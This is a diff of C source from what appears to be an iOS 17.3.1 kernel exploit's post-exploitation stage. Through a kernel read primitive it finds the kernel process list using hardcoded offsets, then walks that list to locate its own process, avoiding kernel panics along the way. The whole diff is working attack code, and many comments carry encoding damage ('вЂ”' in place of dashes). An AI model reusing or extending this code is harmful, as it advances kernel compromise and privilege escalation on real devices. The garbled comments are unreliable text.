-                filelog_write("[allproc] GOT resolved addr 0x%llx failed validation", allproc_ptr);
+            } else {
+                filelog_write("[allproc] GOT read at 0x%llx failed", got_addr);
+            }
+
+            /* Strategy 2: Direct allproc at outer __DATA + 0x60 (__PPLDATA region).
+             * PPL protects writes, not reads. This should be readable via our kread. */
+            if (try_allproc_candidate("PPLDATA_allproc", kbase, 0x3198060ULL, true, &addr)) {
+                filelog_write("[allproc] direct PPLDATA allproc SUCCESS");
+                return addr;
             }
         } else {
-            filelog_write("[allproc] GOT read at 0x%llx failed", got_addr);
+            filelog_write("[allproc] skipping legacy probes (set DS_ENABLE_LEGACY_PROBES=1 to re-enable)");
         }
-
-        /* Strategy 2: Direct allproc at outer __DATA + 0x60 (__PPLDATA region).
-         * PPL protects writes, not reads. This should be readable via our kread. */
-        if (try_allproc_candidate("PPLDATA_allproc", kbase, 0x3198060ULL, true, &addr)) {
-            filelog_write("[allproc] direct PPLDATA allproc SUCCESS");
-            return addr;
-        }
-
         /* Bug #237: disable the old __DATA curated globals entirely.
          * Session 24 showed we now survive long enough to reach ourproc(), but
          * still disconnect while probing DATA_0x31FFF30 before the new narrow
@@ -3606,30 +3815,25 @@ static uint64_t kernprocaddress(void) {
     /* Bug #239 + Bug #245 + Bug #246: Direct allproc candidates.
      *
     * Session 25 runtime gave candidates around 0x321C400..0x321C408.
-    * Session 25d syslog later proved a stronger direct head at 0x321C480.
+    * Session 25d syslog initially suggested 0x321C480, but later offline
+     * triage proved it is not a reliable allproc head and it is no longer
+     * part of the builtin 21D61 shortlist.
     * Continued offline tests v7..v14 refined additional strong
      * __DATA.__common/__bss candidates that are safer to probe with a single
      * 8-byte read than to discover through the noisy 16KB range scan.
      *
     * Current shortlist:
-    *   0x321C480  runtime-proven allproc head from session 25d syslog
-    *   0x321C240  strongest runtime-adjacent doubly-linked head candidate;
-    *              v12/v15/v17 show explicit prev+next head mutation
-    *   0x3213680  strongest __common doubly-linked candidate from v14/v17
-    *   0x3213660..0x3213690 (step 0x8) adjacent micro-window around
-    *              0x3213678/0x3213680 to tolerate small symbol drift
-    *   0x31C3000  retained high-confidence fallback from focused proc windows;
-    *              v16/v18 still show limited PID/head-store evidence
-    *   0x3214850          demoted by Bug #312 after repeated fake-head panics
-    *                      on-device; keep only for explicit manual probes
-    *   0x3213EC8          demoted by Bug #311 after repeated fake-head panics;
-    *                      keep only for explicit manual probes
-    *   0x321C220          v20 shows exact refs but only arithmetic/address-anchor usage,
-    *                      not a head->node traversal
-     *   0x31C30B0  v20 shows repeated [head] + [head+0x8] compares, which looks
-     *              like paired queue-head state rather than LIST_HEAD.lh_first
-    *   0x321C248/3F8/400/408  v19 found no exact head-load windows; these now stay
-    *                           only as tail-end session-artifact probes
+    *   0x31C3000  exact __DATA.__common overlap from anchor-driven pass;
+    *              hit by connectx + pid_shutdown_sockets and already present
+    *              in the historical Tier-1 shortlist
+    *   0x31C7C28  exact __DATA.__common hit from task_for_pid + pid_for_task
+    *   0x3216CC8  exact __DATA.__common hit from setuid/cred path
+    *   0x31FFF30  retained as late legacy fallback from the older focused
+    *              allproc shortlist, but no longer first in the auto path
+    *   0x3213660..0x3213690 (step 0x8) historical __common micro-window;
+    *              now diagnostics-only because v6 did not re-confirm exact hits
+    *   0x321C240/220/248/3F8/400/408, 0x31C30B0  remain explicit full-direct
+    *              diagnostics only, not part of default auto/safe triage
      *
      * Try these FIRST to skip the risky 16KB chunk scan entirely. */
     {
@@ -3637,28 +3841,20 @@ static uint64_t kernprocaddress(void) {
          * DATA-heavy candidates (0x321C2xx/0x321C4xx) are left for opt-in
          * diagnostics only via DS_ENABLE_DATA_DIRECT=1. */
         static const uint64_t direct_offs_minimal[] = {
-            0x31FFF30ULL,   /* Bug #292: allproc LIST_HEAD for iOS 17.3.1 (21D61) A12Z — outer __DATA+0x67F30 */
-            0x3213678ULL,   /* allproc LIST_HEAD candidate */
-            0x3213680ULL,   /* kernproc candidate */
+            0x31C3000ULL,   /* Bug #523: revalidated __DATA.__common overlap; connectx + pid_shutdown_sockets */
+            0x31C7C28ULL,   /* Bug #523: revalidated __DATA.__common hit; task_for_pid + pid_for_task */
         };
         static const uint64_t direct_offs_safe[] = {
-            0x31FFF30ULL,   /* Bug #292: allproc LIST_HEAD for iOS 17.3.1 (21D61) A12Z — outer __DATA+0x67F30 */
-            0x3213660ULL,
-            0x3213668ULL,
-            0x3213670ULL,
-            0x3213678ULL,   /* allproc LIST_HEAD candidate */
-            0x3213680ULL,   /* kernproc candidate */
-            0x3213688ULL,
-            0x3213690ULL,
-            0x321C480ULL,   /* Bug #389: runtime-proven allproc at kbase+0x321C480 */
-            0x321C240ULL,   /* Bug #340: real allproc DATA proc0 head (Build 55: *(0x321C408)=kdata(0x321C240)) */
-            0x321C408ULL,   /* Bug #340: confirmed real allproc offset (Build 52-54 heap, Build 55 kdata) */
-            0x321C400ULL,   /* Bug #340: adjacent ±8 drift probes */
-            0x321C410ULL,
-            0x31C3000ULL,
+            0x31C3000ULL,   /* Bug #523: revalidated __DATA.__common overlap; connectx + pid_shutdown_sockets */
+            0x31C7C28ULL,   /* Bug #523: revalidated __DATA.__common hit; task_for_pid + pid_for_task */
+            0x3216CC8ULL,   /* Bug #523: revalidated __DATA.__common hit; setuid/cred path */
+            0x31FFF30ULL,   /* Bug #292: legacy focused shortlist fallback; demoted behind exact-hit set */
         };
         static const uint64_t direct_offs_full[] = {
-            0x31FFF30ULL,   /* Bug #292: allproc LIST_HEAD for iOS 17.3.1 (21D61) A12Z — outer __DATA+0x67F30 */
+            0x31C3000ULL,   /* Bug #523: revalidated __DATA.__common overlap; connectx + pid_shutdown_sockets */
+            0x31C7C28ULL,   /* Bug #523: revalidated __DATA.__common hit; task_for_pid + pid_for_task */
+            0x3216CC8ULL,   /* Bug #523: revalidated __DATA.__common hit; setuid/cred path */
+            0x31FFF30ULL,   /* Bug #292: legacy focused shortlist fallback */
             0x3213660ULL,
             0x3213668ULL,
             0x3213670ULL,
@@ -3666,7 +3862,6 @@ static uint64_t kernprocaddress(void) {
             0x3213680ULL,
             0x3213688ULL,
             0x3213690ULL,
-            0x321C480ULL,
             0x321C240ULL,
             0x31C3000ULL,
             0x321C220ULL,
@@ -3787,7 +3982,7 @@ static uint64_t kernprocaddress(void) {
                     filelog_write("[allproc] direct 0x%llx: val is kernel DATA ptr 0x%llx "
                                   "(data_off=0x%llx), checking as DATA-resident proc0...",
                                   candidate, stripped, stripped - kbase);
-                    /* Read PID at stripped+0x60 — if 0, this is proc0 (kernel_task) */
+                    /* Read PID at stripped+0x60 вЂ” if 0, this is proc0 (kernel_task) */
                     uint32_t d_pid = 0xFFFFFFFF;
                     bool d_ok = ds_kread32_checked(stripped + 0x60, &d_pid);
                     filelog_write("[allproc] DATA-proc0 PID read: kread=%d pid=%u at 0x%llx",
@@ -3822,7 +4017,7 @@ static uint64_t kernprocaddress(void) {
                                     if (lp2_ok && lp2_val == stripped) {
                                         le_next_ok = ds_kread32_checked(le_next + PROC_PID_OFFSET, &le_next_pid);
                                     } else {
-                                        filelog_write("[allproc] Bug #342: le_prev mismatch — skip +0x%x read (prevent zone panic)",
+                                        filelog_write("[allproc] Bug #342: le_prev mismatch вЂ” skip +0x%x read (prevent zone panic)",
                                                       PROC_PID_OFFSET);
                                     }
                                 }
@@ -3830,10 +4025,10 @@ static uint64_t kernprocaddress(void) {
                                               (int)le_next_ok, le_next_pid,
                                               (int)(le_next_ok && le_next_pid > 0 && is_plausible_pid(le_next_pid)));
                                 if (!(le_next_ok && le_next_pid > 0 && is_plausible_pid(le_next_pid))) {
-                                    filelog_write("[allproc] Bug #270: DATA-proc0 le_next PID invalid/zero — rejecting candidate");
+                                    filelog_write("[allproc] Bug #270: DATA-proc0 le_next PID invalid/zero вЂ” rejecting candidate");
                                     continue;
                                 }
-                                /* Transition: allproc → proc0(DATA) → heap proc chain.
+                                /* Transition: allproc в†’ proc0(DATA) в†’ heap proc chain.
                                  * Accept this candidate and set up direct layout.
                                  * ourproc() will start from proc0 and walk le_next into heap. */
                                 PROC_LIST_OFFSET = 0x00;   /* BSD LIST_ENTRY at proc+0 */
@@ -3868,7 +4063,7 @@ static uint64_t kernprocaddress(void) {
                                     bool sn_ok = ds_kread32_checked(sle_next + 0x60, &sn_pid);
                                     /* Bug #340: also try PROC_PID_OFFSET for iOS 17 (0xd8).
                                      * Bug #342: Only retry if sle_next+0x60 read SUCCEEDED;
-                                     * if it failed, sle_next may be freed/invalid — don't
+                                     * if it failed, sle_next may be freed/invalid вЂ” don't
                                      * read at deeper offset to avoid zone_require panic. */
                                     if (sn_ok && !(sn_pid > 0 && is_plausible_pid(sn_pid)) && PROC_PID_OFFSET != 0x60) {
                                         sn_ok = ds_kread32_checked(sle_next + PROC_PID_OFFSET, &sn_pid);
@@ -3877,7 +4072,7 @@ static uint64_t kernprocaddress(void) {
                                                   (int)sn_ok, sn_pid,
                                                   (int)(sn_ok && sn_pid > 0 && is_plausible_pid(sn_pid)));
                                     if (sn_ok && sn_pid > 0 && is_plausible_pid(sn_pid)) {
-                                        /* Accept: allproc → proc0(DATA) with SMRQ sle_next at +0x08.
+                                        /* Accept: allproc в†’ proc0(DATA) with SMRQ sle_next at +0x08.
                                          * list_off=0 means proc_base IS the SMRQ entry (p_list at proc+0x00).
                                          * Walk: kread64(proc+0x00+0x08) = kread64(proc+0x08) = next_proc_base. */
                                         PROC_LIST_OFFSET = 0x00;
@@ -3903,7 +4098,7 @@ static uint64_t kernprocaddress(void) {
                      * = proc0 + 0xb0, NOT proc0 base.  The SMRQ next pointer is at the
                      * entry itself (proc+0xb0), pointing to next_proc+0xb0.
                      * We read SMRQ next from `stripped` (= proc+0xb0), NOT from proc+0x00
-                     * (which is the BSD le_next — a different list that may be stale). */
+                     * (which is the BSD le_next вЂ” a different list that may be stale). */
                     if (stripped >= 0xb0) {
                         uint64_t d_base2 = stripped - 0xb0;
                         if (is_kptr(d_base2) && d_base2 >= kbase) {
@@ -3957,7 +4152,7 @@ static uint64_t kernprocaddress(void) {
                                                               np_pid_off);
                                                 smrq_ok = true;
                                             } else {
-                                                filelog_write("[allproc] Bug #263A: next_proc PID=%u NOT plausible — "
+                                                filelog_write("[allproc] Bug #263A: next_proc PID=%u NOT plausible вЂ” "
                                                               "this is NOT allproc, skipping candidate", np_pid);
                                                 smrq_ok = false;
                                             }
@@ -3983,10 +4178,10 @@ static uint64_t kernprocaddress(void) {
                                                       candidate, d_base2, smrq_next);
                                         return candidate;
                                     }
-                                    /* Bug #257: TAILQ fallback — if kernel_task is the LAST entry
+                                    /* Bug #257: TAILQ fallback вЂ” if kernel_task is the LAST entry
                                      * (smrq_next=0 or not valid), allproc might be a TAILQ where:
-                                     *   tqh_first at (candidate - 8) → newest_proc + 0xb0
-                                     *   tqh_last  at (candidate)     → &last_proc->smrq_next = proc0+0xb0
+                                     *   tqh_first at (candidate - 8) в†’ newest_proc + 0xb0
+                                     *   tqh_last  at (candidate)     в†’ &last_proc->smrq_next = proc0+0xb0
                                      * Read tqh_first and check if it points to a valid heap proc. */
                                     filelog_write("[allproc] DATA-proc0 SMRQ next invalid (0x%llx), "
                                                   "trying TAILQ: tqh_first at 0x%llx",
@@ -4053,7 +4248,7 @@ static uint64_t kernprocaddress(void) {
                     return candidate;
                 }
                 /* Bug #255: If v2 rejected this candidate (chain too short / wrong PIDs),
-                 * check if it's actually the kernproc variable (→ kernel_task, PID 0).
+                 * check if it's actually the kernproc variable (в†’ kernel_task, PID 0).
                  * kernel_task is at the TAIL of allproc, so forward-chain is always 1.
                  * Accept it and let ourproc() backward-walk via BSD le_prev. */
                 if (detect_kernproc_variable(candidate)) {
@@ -4112,17 +4307,9 @@ static uint64_t kernprocaddress(void) {
     if (allproc_scan_env && allproc_scan_env[0]) {
         enable_allproc_scan = (allproc_scan_env[0] != '0');
     } else if (ds_build_is_21D61()) {
-        const char *auto_scan_env = getenv("DS_ENABLE_ALLPROC_SCAN_AUTO");
-        if (auto_scan_env && auto_scan_env[0] != '0') {
-            enable_allproc_scan = true;
-            filelog_write("[allproc] Bug #448: inner DATA scan auto-last-resort re-enabled via DS_ENABLE_ALLPROC_SCAN_AUTO=1");
-        } else {
-            enable_allproc_scan = false;
-            filelog_write("[allproc] Bug #448: keeping inner DATA scan OFF by default on 21D61 after zone-bound panic during scan fallback "
-                          "(set DS_ENABLE_ALLPROC_SCAN_AUTO=1 to force old behavior)");
-        }
+        enable_allproc_scan = true;
+        filelog_write("[allproc] Bug #518: keeping inner DATA scan ON by default on 21D61 (set DS_ENABLE_ALLPROC_SCAN=0 to disable)");
     }
-
     if (enable_allproc_scan) {
         filelog_write("[allproc] starting inner-kernel DATA range scan (Bug #335: enabled by default)...");
         scanned = scan_allproc_known_range(kbase);
@@ -4178,7 +4365,7 @@ uint64_t ourproc(void) {
 
     filelog_write("[ourproc] enter: verifying kread primitive health...");
 
-    /* Bug #216: health check — read kernel Mach-O magic to verify
+    /* Bug #216: health check вЂ” read kernel Mach-O magic to verify
      * the kread primitive still works before attempting allproc scan.
      * If this fails, the exploit state is broken and we bail early
      * instead of causing a kernel panic during allproc scan. */
@@ -4189,10 +4376,10 @@ uint64_t ourproc(void) {
             if ((magic & 0xFFFFFFFF) == 0xFEEDFACF) {
                 filelog_write("[ourproc] kread health check PASSED (magic=0x%llx at kbase=0x%llx)", magic, kbase);
             } else {
-                filelog_write("[ourproc] WARNING: unexpected magic 0x%llx at kbase — kread may be corrupt", magic);
+                filelog_write("[ourproc] WARNING: unexpected magic 0x%llx at kbase вЂ” kread may be corrupt", magic);
             }
         } else {
-            filelog_write("[ourproc] FATAL: kread health check FAILED — cannot read kbase 0x%llx", kbase);
+            filelog_write("[ourproc] FATAL: kread health check FAILED вЂ” cannot read kbase 0x%llx", kbase);
             return ds_finish_ourproc_scope(0);
         }
     }
@@ -4256,7 +4443,7 @@ uint64_t ourproc(void) {
             kernproc = pac_strip(kernproc_raw);
         }
     }
-    filelog_write("[ourproc] allproc=0x%llx → raw=0x%llx base=0x%llx list_off=0x%x next_off=0x%x prev_off=0x%x",
+    filelog_write("[ourproc] allproc=0x%llx в†’ raw=0x%llx base=0x%llx list_off=0x%x next_off=0x%x prev_off=0x%x",
                   kernprocaddr, kernproc_raw, kernproc, PROC_LIST_OFFSET, PROC_NEXT_OFFSET, PROC_PREV_OFFSET);
 
     /* Bug #261C: Dump proc0 entry fields for structure confirmation */
@@ -4279,7 +4466,7 @@ uint64_t ourproc(void) {
      * already confirmed by kernprocaddress(). */
     bool heap_ok = g_kernproc_is_pid0 ? is_heap_ptr_relaxed(kernproc) : is_heap_ptr(kernproc);
     if (!heap_ok && g_direct_layout_set && is_kernel_data_ptr(kernproc)) {
-        /* Bug #256B: proc0 is in kernel DATA — allow it */
+        /* Bug #256B: proc0 is in kernel DATA вЂ” allow it */
         filelog_write("[ourproc] proc0 in kernel DATA (0x%llx), allowing due to direct_layout",
                       kernproc);
         heap_ok = true;
@@ -4293,7 +4480,7 @@ uint64_t ourproc(void) {
 
     /* Bug #238: le_prev mismatch check to find true allproc head.
      * Bug #262A: SKIP this for DATA-resident proc0. Reading le_prev from SMRQ
-     * in DATA may point to PPLDATA-protected addresses → kernel panic.
+     * in DATA may point to PPLDATA-protected addresses в†’ kernel panic.
      * DATA-proc0 discovered via SMRQ has a confirmed allproc address already. */
     if (have_layout && kernproc && !is_kernel_data_ptr(kernproc) && is_heap_ptr(kernproc)) {
         uint64_t first_leprev = 0;
@@ -4321,11 +4508,17 @@ uint64_t ourproc(void) {
                             alt_ok = read_proc_pid_checked(alt_base, PROC_PID_OFFSET, &alt_pid)
                                      && is_plausible_pid(alt_pid);
                         }
-                        if (alt_ok && is_heap_ptr(alt_base)) {
+                        bool alt_head_ok = first_leprev_stripped && is_kernel_data_ptr(first_leprev_stripped);
+                        if (!alt_head_ok) {
+                            filelog_write("[ourproc] TAILQ/adjacent fix: skip head switch (le_prev head not kernel-data: 0x%llx)",
+                                          first_leprev_stripped);
+                        }
+                        if (alt_ok && is_heap_ptr(alt_base) && alt_base != kernproc &&
+                            alt_head_ok && !is_candidate_blacklisted(first_leprev_stripped)) {
                             filelog_write("[ourproc] TAILQ/adjacent fix: switching head 0x%llx(pid=%u) -> 0x%llx(pid=%u)",
                                           kernproc, 0, alt_base, alt_pid);
                             kernproc = alt_base;
-                            kernprocaddr = first_leprev;
+                            kernprocaddr = first_leprev_stripped;
                         }
                     }
                 }
@@ -4344,7 +4537,7 @@ uint64_t ourproc(void) {
     int logged = 0; /* log first 30 procs for diagnostics */
     uint32_t max_pid_seen = 0;
     int zombies_skipped = 0; /* Bug #375: consecutive zombie-proc skips */
-    /* Bug #233: cycle detection — circular sublists would loop forever */
+    /* Bug #233: cycle detection вЂ” circular sublists would loop forever */
     uint64_t cycle_visited[256];
     int cycle_nvisited = 0;
     /* Bug #267B: collect forward-walked proc addresses for brute-force PID search */
@@ -4412,7 +4605,7 @@ uint64_t ourproc(void) {
                     pid_ok = true;
                 }
             }
-            /* Bug #375: zombie/freed BSD proc in allproc list — p_pid field is garbage
+            /* Bug #375: zombie/freed BSD proc in allproc list вЂ” p_pid field is garbage
              * but p_list.le_next may still be valid (zombie procs remain in allproc
              * until reaped by their parent).  Skip up to 5 consecutive zombie entries
              * rather than terminating the walk prematurely.  This matters for
@@ -4431,7 +4624,7 @@ uint64_t ourproc(void) {
                         continue;
                     }
                 }
-                filelog_write("[ourproc] Bug #375: zombie at step %d 0x%llx has no valid le_next — can't skip",
+                filelog_write("[ourproc] Bug #375: zombie at step %d 0x%llx has no valid le_next вЂ” can't skip",
                               count, currentproc);
             }
             if (!pid_ok) {
@@ -4452,7 +4645,7 @@ uint64_t ourproc(void) {
         }
 
         if (pid == (uint32_t)ourpid) {
-            /* Found our proc — now discover name offset dynamically */
+            /* Found our proc вЂ” now discover name offset dynamically */
             bool have_name_offset = discover_name_offset(currentproc) && PROC_NAME_OFFSET != 0;
             char name[64] = {0};
             if (have_name_offset) {
@@ -4520,7 +4713,11 @@ uint64_t ourproc(void) {
                   count, ourpid, max_pid_seen);
 
     bool suspicious_pid_signal = (max_pid_seen < (uint32_t)ourpid) || (max_pid_seen >= 0x10000);
-    if (PROC_PID_OFFSET != 0 && count >= 8 && suspicious_pid_signal) {
+    /* Bug #511: allow alt pid_off retry on zero-only short chains (count < 8).
+     * When g_direct_layout_set and max_pid_seen==0, current pid_off may be wrong
+     * for user procs. Try the alternate offset (0xD8 в†” 0x60) early. */
+    bool allow_zero_chain_alt = (g_direct_layout_set && max_pid_seen == 0 && count >= 0);
+    if (PROC_PID_OFFSET != 0 && suspicious_pid_signal && (count >= 8 || allow_zero_chain_alt)) {
         uint32_t alt_pid_off = (PROC_PID_OFFSET == 0xd8) ? 0x60 : 0xd8;
         uint32_t alt_max_pid = 0;
         int alt_steps = 0;
@@ -4555,9 +4752,17 @@ uint64_t ourproc(void) {
      * a BSD LIST_ENTRY where le_next=heap(next proc) and le_prev=kdata(&allproc).
      * The current wrong chain shows list_off=0xb0 (p_pglist?); the real p_list
      * should appear at a different offset with diverse PIDs including ourpid. */
-    if (count >= 10 && max_pid_seen > 0 && ((max_pid_seen < (uint32_t)ourpid) || (max_pid_seen >= 0x10000))) {
-        filelog_write("[ourproc] Bug #337 diag: proc0=0x%llx list_off=0x%x pid_off=0x%x max_pid=%u ourpid=%d",
-                      kernproc, PROC_LIST_OFFSET, PROC_PID_OFFSET, max_pid_seen, ourpid);
+    /* Bug #337+448 fix: also trigger when max_pid_seen==0 and kernproc is heap-based
+     * (Bug #451 triage candidate). In this case le_next=0x0 so forward walk immediately
+     * exits, but walking proc0[+0x00] may still find ourpid on a different list. */
+    /* Bug #510: removed count >= 1 requirement. When Bug #451 triage accepted 0x3213680
+     * (tqh_last), walk ends at count=0 because le_next=NULL (end of list). Bug #337+448
+     * backward walk is exactly the recovery for this case, but count >= 1 blocked it.
+     * Now activates whenever max_pid_seen==0 with a heap-based kernproc. */
+    bool bug337_zero_heap = (max_pid_seen == 0 && g_direct_layout_set && is_heap_ptr_relaxed(kernproc));
+    if ((count >= 10 && max_pid_seen > 0 && ((max_pid_seen < (uint32_t)ourpid) || (max_pid_seen >= 0x10000))) || bug337_zero_heap) {
+        filelog_write("[ourproc] Bug #337 diag: proc0=0x%llx list_off=0x%x pid_off=0x%x max_pid=%u ourpid=%d zero_heap=%d",
+                      kernproc, PROC_LIST_OFFSET, PROC_PID_OFFSET, max_pid_seen, ourpid, (int)bug337_zero_heap);
         for (uint32_t doff = 0; doff <= 0xF8; doff += 8) {
             uint64_t dval = 0;
             ds_kread64_checked(kernproc + doff, &dval);
@@ -4609,7 +4814,7 @@ uint64_t ourproc(void) {
                     PROC_LIST_OFFSET = 0x00;
                     PROC_NEXT_OFFSET = 0x00;
                     PROC_PREV_OFFSET = 0x08;
-                    filelog_write("[ourproc] Bug #337+448: recovery — updated list_off=0x00, returning proc=0x%llx", found_via_337);
+                    filelog_write("[ourproc] Bug #337+448: recovery вЂ” updated list_off=0x00, returning proc=0x%llx", found_via_337);
                     discover_name_offset(found_via_337);
                     return ds_finish_ourproc_scope(found_via_337);
                 }
@@ -4670,24 +4875,49 @@ uint64_t ourproc(void) {
 
     /* Bug #263F: If ALL walked procs had PID=0 and were in DATA, this allproc
      * candidate was WRONG (e.g. zone descriptor array at 0x321C240).
-     * Invalidate cache and retry kernprocaddress() to try other candidates. */
+     * Invalidate cache and retry kernprocaddress() to try other candidates.
+     * Bug #263F-heap: Extend to heap-based PID=0 triage candidates (Bug #451):
+     * if kernproc is heap ptr, max_pid_seen==0, and forward walk exited at step 0
+     * (count<=1), the Bug #451 candidate is also wrong вЂ” blacklist and retry.
+     * 
+     * BUG FIX: Iterative retry loop. If kernprocaddress() returns another bad
+     * candidate (also max_pid_seen==0), blacklist THAT and retry again. Up to 5
+     * attempts to break out of cascading bad candidates. */
     bool data_zero_chain = (g_direct_layout_set && is_kernel_data_ptr(kernproc) &&
                             count >= 2 && max_pid_seen == 0);
-    if (data_zero_chain) {
-        filelog_write("[ourproc] Bug #263F: DATA chain invalid (steps=%d max_pid=%u) — WRONG allproc! "
-                      "Invalidating cache, retrying kernprocaddress()...", count, max_pid_seen);
-        /* Bug #265B: Blacklist this candidate so it's not re-accepted on retry */
-        if (add_candidate_blacklist(kernprocaddr)) {
-            filelog_write("[ourproc] Bug #265B: blacklisted candidate 0x%llx (total=%d)",
-                          kernprocaddr, g_blacklisted_count);
-        }
-        g_kernproc_addr = 0;
-        g_direct_layout_set = false;
-        g_kernproc_is_pid0 = false;
-        uint64_t retry_addr = kernprocaddress();
-        if (retry_addr && retry_addr != kernprocaddr) {
-            filelog_write("[ourproc] Bug #263F: retried kernprocaddress() returned 0x%llx (was 0x%llx)",
-                          retry_addr, kernprocaddr);
+    bool heap_zero_chain = (g_direct_layout_set && is_heap_ptr_relaxed(kernproc) &&
+                            max_pid_seen == 0 && count <= 1);
+    bool short_implausible_head = (g_direct_layout_set && count <= 1 && max_pid_seen >= 0x10000);
+    if (data_zero_chain || heap_zero_chain || short_implausible_head) {
+        for (int retry_attempt = 0; retry_attempt < 5; retry_attempt++) {
+            const char *chain_tag = heap_zero_chain ? "heap" : (short_implausible_head ? "short-implausible" : "DATA");
+            filelog_write("[ourproc] Bug #263F%s attempt %d: %s chain invalid (steps=%d fwd_count=%d max_pid=%u) вЂ” WRONG allproc! "
+                          "Blacklisting 0x%llx and retrying...",
+                          heap_zero_chain ? "-heap" : (short_implausible_head ? "-impl" : ""),
+                          retry_attempt,
+                          chain_tag,
+                          count, fwd_count, max_pid_seen, kernprocaddr);
+            /* Bug #265B: Blacklist this candidate so it's not re-accepted on retry */
+            if (add_candidate_blacklist(kernprocaddr)) {
+                filelog_write("[ourproc] Bug #265B: blacklisted candidate 0x%llx (total=%d)",
+                              kernprocaddr, g_blacklisted_count);
+            }
+            
+            /* Save current layout state before reset, to restore if retry also fails */
+            bool saved_direct_layout = g_direct_layout_set;
+            bool saved_kernproc_is_pid0 = g_kernproc_is_pid0;
+            
+            g_kernproc_addr = 0;
+            g_direct_layout_set = false;
+            g_kernproc_is_pid0 = false;
+            uint64_t retry_addr = kernprocaddress();
+            if (!retry_addr || retry_addr == kernprocaddr) {
+                filelog_write("[ourproc] Bug #263F: attempt %d kernprocaddress() returned same/null 0x%llx, giving up",
+                              retry_attempt, retry_addr);
+                break;
+            }
+            filelog_write("[ourproc] Bug #263F: attempt %d retried kernprocaddress() returned 0x%llx (was 0x%llx)",
+                          retry_attempt, retry_addr, kernprocaddr);
             /* Re-read new head and restart walk */
             uint64_t retry_raw = ds_kread64(retry_addr);
             uint64_t retry_stripped = pac_strip(retry_raw);
@@ -4697,16 +4927,20 @@ uint64_t ourproc(void) {
             } else {
                 retry_proc = retry_stripped;
             }
-            filelog_write("[ourproc] Bug #263F: new head proc=0x%llx, re-walking...",
-                          retry_proc);
+            filelog_write("[ourproc] Bug #263F: attempt %d new head proc=0x%llx, re-walking...",
+                          retry_attempt, retry_proc);
             
             /* Quick forward walk with new parameters */
             uint64_t rcur = retry_proc;
+            uint32_t retry_max_pid = 0;
+            int retry_count = 0;
             for (int ri = 0; ri < 4000 && rcur; ri++) {
                 bool rok = is_heap_ptr_relaxed(rcur);
-                if (!rok && g_direct_layout_set && is_kernel_data_ptr(rcur)) rok = true;
+                /* Bug #263F-SOLVE1: Use saved layout_set for retry walk so it can properly
+                 * detect kernel DATA resident procs with the same criteria as main walk */
+                if (!rok && saved_direct_layout && is_kernel_data_ptr(rcur)) rok = true;
                 if (!rok) {
-                    filelog_write("[ourproc] retry walk: ptr invalid at step %d: 0x%llx", ri, rcur);
+                    filelog_write("[ourproc] attempt %d retry walk: ptr invalid at step %d: 0x%llx", retry_attempt, ri, rcur);
                     break;
                 }
                 uint32_t rpid = 0;
@@ -4714,18 +4948,20 @@ uint64_t ourproc(void) {
                 /* Accept PID=0 for step 0 (kernel_task) */
                 if (rpid == 0 && ri > 0) break;
                 if (ri < 20 || rpid == (uint32_t)ourpid)
-                    filelog_write("[ourproc] retry [%d] proc=0x%llx pid=%u heap=%d",
-                                  ri, rcur, rpid, (int)is_heap_ptr_relaxed(rcur));
+                    filelog_write("[ourproc] attempt %d retry [%d] proc=0x%llx pid=%u heap=%d",
+                                  retry_attempt, ri, rcur, rpid, (int)is_heap_ptr_relaxed(rcur));
                 if (rpid == (uint32_t)ourpid) {
-                    filelog_write("[ourproc] FOUND via retry at step %d!", ri);
+                    filelog_write("[ourproc] FOUND via attempt %d retry at step %d!", retry_attempt, ri);
                     discover_name_offset(rcur);
                     return ds_finish_ourproc_scope(rcur);
                 }
+                if (rpid > retry_max_pid) retry_max_pid = rpid;
+                retry_count = ri;
                 uint64_t rnext_raw = 0;
                 if (!ds_kread64_checked(rcur + PROC_LIST_OFFSET + PROC_NEXT_OFFSET, &rnext_raw)) break;
                 uint64_t rnext_s = pac_strip(rnext_raw);
                 if (rnext_s == retry_addr) {
-                    filelog_write("[ourproc] retry walk: circular sentinel at step %d", ri);
+                    filelog_write("[ourproc] attempt %d retry walk: circular sentinel at step %d", retry_attempt, ri);
                     break;
                 }
                 uint64_t rnext = 0;
@@ -4734,7 +4970,25 @@ uint64_t ourproc(void) {
                 if (rnext == rcur) break;
                 rcur = rnext;
             }
-            filelog_write("[ourproc] Bug #263F: retry walk did not find PID %d", ourpid);
+            filelog_write("[ourproc] Bug #263F: attempt %d retry walk done (steps=%d max_pid=%u)", retry_attempt, retry_count, retry_max_pid);
+            
+            /* If this retry ALSO returned max_pid_seen==0, blacklist it and loop for another candidate.
+             * BUG FIX #263F-B: removed "&& retry_count > 0" вЂ” when steps=0 (retry_count stays 0)
+             * and max_pid=0, the candidate is equally bad and must be blacklisted+retried. */
+            if (retry_max_pid == 0) {
+                filelog_write("[ourproc] Bug #263F: attempt %d also returned max_pid==0 (steps=%d), blacklisting 0x%llx and retrying again",
+                              retry_attempt, retry_count, retry_addr);
+                kernprocaddr = retry_addr;  /* Blacklist THIS bad candidate on next iteration */
+                /* Restore saved state so kernprocaddress() on next iteration has clean context */
+                g_direct_layout_set = saved_direct_layout;
+                g_kernproc_is_pid0 = saved_kernproc_is_pid0;
+                /* Continue loop to next retry attempt */
+                continue;
+            } else {
+                /* Retry found good candidate or no more to retry */
+                filelog_write("[ourproc] Bug #263F: attempt %d exhausted, max_pid=%u", retry_attempt, retry_max_pid);
+                break;
+            }
         }
     }
 
@@ -4742,11 +4996,11 @@ uint64_t ourproc(void) {
      * Bug #243: BACKWARD WALK via le_prev + Alternative list offsets.
      *
      * offline_test_v6 proved:
-     *   - kbase+0x321C480 has ZERO code xrefs in kernelcache → NOT allproc
-     *   - Bug #241 nearby-head scan ±0x90 cannot reach ANY allproc candidate
+     *   - kbase+0x321C480 has ZERO code xrefs in kernelcache в†’ NOT allproc
+     *   - Bug #241 nearby-head scan В±0x90 cannot reach ANY allproc candidate
      *     (nearest is 23 KB away, real PPLDATA allproc is 529 KB away)
      *   - list_off=0xb0 may be p_pglist (process group list), NOT p_list
-     *   - Real allproc is in PPLDATA → unreadable via kread on A12+
+     *   - Real allproc is in PPLDATA в†’ unreadable via kread on A12+
      *
      * Strategy A: Walk BACKWARD via le_prev from the first proc we found.
      *   In BSD LIST: le_prev = &prev_proc->le_next = prev_proc + list_off
@@ -4766,7 +5020,7 @@ uint64_t ourproc(void) {
         if (g_kernproc_is_pid0) {
             bwalk_entry_ok = is_heap_ptr_relaxed(kernproc);
         } else if (g_direct_layout_set && is_kptr(kernproc) && kernproc >= kbase) {
-            /* Bug #257: proc0 in kernel DATA — still try backward walk */
+            /* Bug #257: proc0 in kernel DATA вЂ” still try backward walk */
